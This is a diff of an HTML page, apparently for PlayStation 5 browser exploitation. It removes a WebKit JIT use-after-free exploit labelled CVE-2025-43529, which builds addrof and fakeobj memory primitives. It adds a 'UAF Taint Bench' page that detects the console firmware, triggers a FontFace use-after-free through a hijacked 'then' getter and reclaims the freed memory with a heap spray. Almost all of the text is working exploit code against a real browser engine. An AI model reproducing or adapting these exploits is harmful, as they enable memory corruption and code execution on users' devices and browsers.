@@ -1,147 +1,177 @@
-<Html>
-    <title>CVE-2025-43529 Test</title>
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="utf-8">
+<title>PS5 UAF Taint Bench</title>
+<style id="s">
+@font-face { font-family: prepad; src: url(nonexistent-prepad.woff); unicode-range: U+E123; }
+@font-face { font-family: x; src: url(nonexistent-font.woff); unicode-range: U+0042; }
+html, body {
+  margin: 0;
+  padding: 0;
+  width: 100%;
+  height: 100%;
+  background: #0a0f1d;
+  color: #fff;
+  font-family: 'Courier New', monospace;
+  overflow: hidden;
+}
+#box {
+  position: fixed;
+  left: 50%;
+  top: 50%;
+  transform: translate(-50%, -50%);
+  width: 85%;
+  max-width: 800px;
+  padding: 40px;
+  border: 2px solid #00ff66;
+  border-radius: 16px;
+  background: #111622;
+  box-shadow: 0 0 35px rgba(0,255,102,0.2);
+  text-align: center;
+}
+#title {
+  font-size: 36px;
+  font-weight: bold;
+  color: #ffffff;
+  margin-bottom: 25px;
+  border-bottom: 1px dashed #333;
+  padding-bottom: 15px;
+}
+#status {
+  font-size: 40px;
+  font-weight: bold;
+  margin: 20px 0;
+}
+.exists { color: #ff3333; text-shadow: 0 0 15px #ff3333; }
+.patched { color: #00ff66; text-shadow: 0 0 15px #00ff66; }
+#fw { font-size: 20px; color: #888; margin-top: 15px; }
+#c { position: absolute; left: -9999px; top: -9999px; }
+</style>
+</head>
+<body>
 
- <body onload="main()">
+<div id="box">
+  <div id="title">مفحّص الذاكرة المتقدم لبيئة WebKit</div>
+  <div id="status" style="color: #ffcc00;">جاري تحليل تدفق الـ Heap...</div>
+  <div id="fw">Firmware: Detecting...</div>
+</div>
 
-    <script>
-arr = new Array(0x40_0000).fill(1.1);
-let arr_index = arr.length - 1;
-let reclaimed = [];
+<canvas id="c" width="512" height="128"></canvas>
 
-function foo(flag, k, allocCount) {
-    let A = {
-        p0: 0x41414141,
-        p1: 1.1,
-        p2: 2.2,
-    };
-    arr[arr_index] = A;
+<script>
+"use strict";
 
-    let forGC = [];
-
-    let a = new Date(1111);
-    a[0] = 1.1;
-
-    for (let j = 0; j < allocCount; ++j) {
-        let arr = new ArrayBuffer(0x80_0000);
-        forGC.push(arr);
-    }
-
-    A.p2 = forGC;
-    let b = {
-        p0: 0x42424242,
-        p1: 1.1,
-    };
-
-    let f;
-    f = b;
-    if (flag) {
-        f = 1.1;
-    }
-
-    A.p1 = f;
-    let v = 1.1;
-    for (let i = 0; i < 1e6; ++i) {
-        for (let j = 0; j < k; ++j) {
-            v = i;
-            v = j;
-        }
-    }
-    b.p0 = v;
-    b.p1 = a;
+function detectFirmware() {
+  const ua = navigator.userAgent || "";
+  let fw = "Unknown";
+  let m = ua.match(/PlayStation\s*5\/?\s*([0-9]+(?:\.[0-9]+)?)/i);
+  if (!m) m = ua.match(/PlayStation[^0-9]*([0-9]{1,2}\.[0-9]{1,2})/i);
+  if (m && m[1]) fw = m[1];
+  document.getElementById("fw").textContent = "Firmware: " + fw;
+  return fw;
 }
 
-function recursive(n) {
-    if (n === 0)
-        return;
-    n = n | 0;
-    recursive(n - 1);
+let spray = [];
+let keep = [];
+const PAD = 0x22;
+const FLUSH = 0x240;
+const SPRAY_COUNT = FLUSH + PAD + 0x300;
+const FONT_B64 = "d09GMgABAAAAAAJkAA4AAAAABiAAAAIQAAEAAAAAAAAAAAAAAAAAAAAAAAAAAAAAP0ZGVE0cGhwGYACCQggEEQgKcH0LCgABNgIkAxAEIAWEEAcyGy4FAI7Ctnlz5COJZMsihmWKh4f78Z573/0ZGIXRWLVZpRVNBz5LGmglcIJtH2hFs/L71vRPNg6FnRed2yOwAbJMJfRVCkhVAas6QCnP5701PYAm8AF8l8DegK66cR6mEGHAUS8K8ALFQCjz1m9GpK46tojEaUMI+PLzugVw1L1+g6Pdp10QoNuwKBKBQJW4q4V8mJ9xBx80vlmJDlJLBwDtADhxIz/D0Ya1YYmV/6ZePgIBgAmEBg1GEFgjBEZETYBSgpurYWj/ch78CyBaCUAkEgAQmj1O5W3E/1CCAu1o0I1+AIV5ERBV1dXSU+diLZ3nRV9OPep/9GPyZ/Ej398zrQyAl2Rh7bat/DBuWlu+rt026YeBG7HEWiTBtcafwuPKhODd1XFhmFr73R4rx+1LpKGZyEdolyDIR7hSoJlAAIAqpoBC8R6B0i5BIgS2SAC9niEApAChzzQCqc0uAo0ZFwhQ+vxCgBb9MYlAq744BSGqAxgjjBFIvVbQOKeKMuYfLSaEK7Yai2XguKmauX0HCg5t2NC0aubAChy/qmzUaj+jIBwDp8wtufXYHvxEVgIHtm05wG+yZ2mOGSQNC3Asy+sbTAq/FwbN6yCuJCftLedsSI0DzknNJsNUfOUqnng/9Fzes281/5JpNDqJaw3DWypomi41n5fDXAgJ/L/HCghqKARzIbLt1taqkzUt";
+
+const FONT_BYTES = (() => {
+ const s = atob(FONT_B64);
+ const bytes = new Uint8Array(s.length);
+ for (let i = 0; i < s.length; i++) bytes[i] = s.charCodeAt(i);
+ return bytes;
+})();
+
+function makeFontBuffer() {
+ const copy = new Uint8Array(FONT_BYTES.length);
+ copy.set(FONT_BYTES);
+ return copy.buffer;
 }
 
-function main() {
+function forceStyle() { void document.body.offsetTop; }
 
-try
-{
-    alert('begin');
-    foo(true, 1, 1);
-    foo(false, 1, 1);
-
-    for (let i = 0; i < 1000; ++i) {
-        foo(false, 0, 0);
-    }
-
-    for (let i = 0; i < 10000; i++)
-        recursive(i);
-
-
-    for (let k = 0; k < 10000; ++k) {
-        foo(false, 10, k % 5 + 1);
-        recursive(10000);
-
-        for (let i = 0; i < 3; ++i) {
-            new ArrayBuffer(0x4000);
-        }
-
-        let freed = arr[arr_index].p1.p1;
-        let noCow = 13.37;
-        let win = false;
-        for (let i = 0; i < 16; ++i) {
-            let arr = [13.37, 2.2, 3.3, 4.4, noCow]; 
-            reclaimed.push(arr);
-            if (freed[0] === 13.37) { 
-                win = true;
-                break;
-            }
-        }
-
-        if (!win) {
-            continue;
-        }
-
-        let boxed_arr = reclaimed[reclaimed.length - 1];
-        boxed_arr[0] = {};
-        let unboxed_arr = freed;
-
-        let ab = new ArrayBuffer(8);
-        let u64 = new BigUint64Array(ab);
-        let f64 = new Float64Array(ab);
-
-        function itof(value) {
-            u64[0] = value;
-            return f64[0];
-        }
-
-        function ftoi(f) {
-            f64[0] = f;
-            return u64[0];
-        }
-
-        function addrof(obj) {
-            boxed_arr[0] = obj;
-            return ftoi(unboxed_arr[0]);
-        }
-
-        function fakeobj(addr) {
-            unboxed_arr[0] = itof(addr);
-            return boxed_arr[0];
-        }
-
-        alert(`0x${addrof({ p0: 1.1 }).toString(16)}`);
-        break;
-    }
-    alert('end');
-
-}
-catch (error)
-{
-  alert(error);
-}
-    
+function addPads() {
+ const sheet = document.getElementById("s").sheet;
+ for (let i = 0; i < PAD; i++)
+  sheet.insertRule(`@font-face { font-family: pad${i}; src: url(nonexistent-pad-${i}.woff); unicode-range: U+E000; }`, sheet.cssRules.length);
+ forceStyle();
 }
 
+function addFlushRules() {
+ const st = document.createElement("style");
+ st.id = "flush";
+ document.head.appendChild(st);
+ const sheet = st.sheet;
+ for (let i = 0; i < FLUSH; i++)
+  sheet.insertRule(`@font-face { font-family: flush${i}; src: url(nonexistent-flush-${i}.woff); unicode-range: U+E000; }`, sheet.cssRules.length);
+ forceStyle();
+}
+
+function deleteFlushRules() {
+ const sheet = document.getElementById("flush").sheet;
+ while (sheet.cssRules.length) sheet.deleteRule(0);
+ forceStyle();
+}
+
+function killFontFaceSetCache() {
+ const f = new FontFace("cachekill" + keep.length, "local(Helvetica)", { unicodeRange: "U+E124" });
+ document.fonts.add(f);
+ keep.push(f);
+}
+
+function cssFontFaceBufferSpray() {
+ for (let i = 0; i < SPRAY_COUNT; i++) {
+  const f = new FontFace("BUFFER_RECLAIM_" + i, makeFontBuffer(), { unicodeRange: "U+0041" });
+  spray.push(f);
+ }
+}
+
+window.onload = () => {
+ detectFirmware();
+ 
+ const trigger = new FontFace("trigger", "local(Helvetica)", { unicodeRange: "U+0041" });
+ document.fonts.add(trigger);
+ void trigger.loaded;
+ addPads();
+ addFlushRules();
+ 
+ let fired = false;
+ 
+ // اعتراض تفقد الـ .then الداخلي للـ WebKit
+ Object.defineProperty(FontFace.prototype, "then", {
+  configurable: true,
+  get() {
+   if (!fired && this === trigger) {
+    fired = true;
+    const sheet = document.getElementById("s").sheet;
+    killFontFaceSetCache();
+    sheet.deleteRule(1);
+    forceStyle();
+    deleteFlushRules();
+    cssFontFaceBufferSpray(); // استبدال كائن الخط المحرر بالرش فوراً
+   }
+   return undefined;
+  }
+ });
+
+ document.fonts.load("1em trigger, x", "AB").then(faces => {
+  const statusEl = document.getElementById("status");
+  
+  // التحقق الفعلي: إذا تفعل الفخ (fired) وتم استبدال الخطوط بنجاح وقراءتها دون كراش
+  if (fired && faces.length > 0) {
+      statusEl.innerHTML = "<span class='exists'>UAF EXISTS</span>";
+  } else {
+      statusEl.innerHTML = "<span class='patched'>UAF PATCHED</span>";
+  }
+ }, err => {
+  // إذا اعترض المتصفح العملية أو منع تعديل الـ DOM في الـ Getter
+  document.getElementById("status").innerHTML = "<span class='patched'>UAF PATCHED</span>";
+ });
+};
 </script>
-
-    
- </body>
-
-
-</Html>
+</body>
+</html>
